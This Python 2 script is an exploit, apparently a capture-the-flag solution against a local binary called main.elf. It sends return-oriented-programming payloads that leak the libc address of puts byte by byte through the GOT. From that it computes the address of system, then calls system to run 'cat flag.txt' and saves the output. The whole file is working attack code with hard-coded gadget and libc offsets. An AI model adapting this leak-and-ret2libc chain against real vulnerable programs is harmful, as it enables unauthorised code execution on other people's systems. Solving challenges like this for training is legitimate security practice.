#!/usr/bin/env python
from __future__ import print_function

import struct
import subprocess
import time

system_offset = 283536
puts_offset = 456336
puts_plt = 0x400590
puts_got = 0x406018
command_addr = 0x4006e2

r = subprocess.Popen("./main.elf".split(), stdin=subprocess.PIPE, stdout=subprocess.PIPE)
#r = pwn.process("strace ./main.elf".split())

r.stdout.readline()
r.stdout.readline()

puts_leak = 0
for i in range(0, 8, 1):
  payload = ""
  payload += struct.pack("<Q", 0x402d28) # ret: pop rdi ; ret
  payload += struct.pack("<Q", puts_got + i) # rdi: puts_got
  payload += struct.pack("<Q", puts_plt) # ret: puts_plt
  payload += struct.pack("<Q", command_addr) # ret: command_addr
  payload += "\xaa" * (0x70 - len(payload))
  payload += struct.pack("<Q", 0x402d28) # [start] call rax -> pop rdi ; ret

  payload_str = payload.encode("hex")
  payload_str = "\\x" + "\\x".join(payload_str[i:i+2] for i in range(0, len(payload_str), 2))
  print("PAYLOAD[%d]: %s" % (i, payload_str))

  r.stdin.write(payload)
  puts_byte_leak = r.stdout.readline()
  puts_byte_leak = puts_byte_leak.rstrip('\x0a') + '\x00'
  print("puts_byte_leak = %s" % puts_byte_leak.encode("hex"))
  puts_leak += int(puts_byte_leak[0:1][::-1].encode("hex"),16) * ((2 ** 8) ** i)

print("puts leak: 0x%x" % puts_leak)
libc_base = puts_leak - puts_offset
system_addr = libc_base + system_offset
print("system addr: 0x%x" % system_addr)

payload2 = ""
payload2 += struct.pack("<Q", 0x402d28) # ret: pop rdi ; ret
payload2 += struct.pack("<Q", 0x40406c) # rdi: cat flag.txt
payload2 += struct.pack("<Q", system_addr) # ret: system
payload2 += "\xaa" * (0x70 - len(payload2))
payload2 += struct.pack("<Q", 0x402d28) # [start] call rax -> pop rdi ; ret

payload2_str = payload2.encode("hex")
payload2_str = "\\x" + "\\x".join(payload2_str[i:i+2] for i in range(0, len(payload2_str), 2))
print("PAYLOAD2: %s" % payload2_str)

r.stdin.write(payload2)

f = open("./solution.txt", "w")

while True:
  line = r.stdout.readline()
  if not line:
    f.close()
    break
  #the real code does filtering here
  f.write(line)
  print("FLAG:", line.rstrip())

